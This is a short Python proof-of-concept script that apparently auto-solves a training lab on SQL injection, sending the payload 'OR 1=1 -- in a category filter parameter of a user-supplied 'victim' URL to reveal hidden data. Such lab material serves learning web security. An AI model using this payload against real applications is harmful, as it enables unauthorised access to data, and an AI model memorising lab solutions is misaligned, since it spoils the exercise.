# POC Script for "SQL injection vulnerability in WHERE clause allowing retrieval of hidden data" 

import argparse
import requests
import sys

def success(text):
    print("[\033[32;1m+\033[0m] " + text + "\033[0m")

def failure(text):
    print("[\033[31;1m✘\033[0m] \033[31;1m" + text + "\033[0m")
    sys.exit()

def info(text):
	print("[\033[34;1m*\033[0m] " + text + "\033[0m")
     
def dbg(text):
    if args.debug:
        print("[\033[90m#\033[0m] " + text + "\033[0m")

def status(url):
     resp_obj = requests.get(url)
     if(resp_obj.status_code == 200):
        info("Host is reachable")
     else:
         failure("Host not reachable")

if __name__ == "__main__":
    info("Starting Auto Solve Script - SQLi Lab 1")
    parser = argparse.ArgumentParser(description="")
    parser.add_argument("--url", required=True, help="URL of the victim application")
    args = parser.parse_args()
    url = args.url.rstrip('/')
    status(url)

    info("Sending Request to: " + url)
    requests.get(url+"/filter?category='OR 1=1 --")
    success("The lab has been Completed")

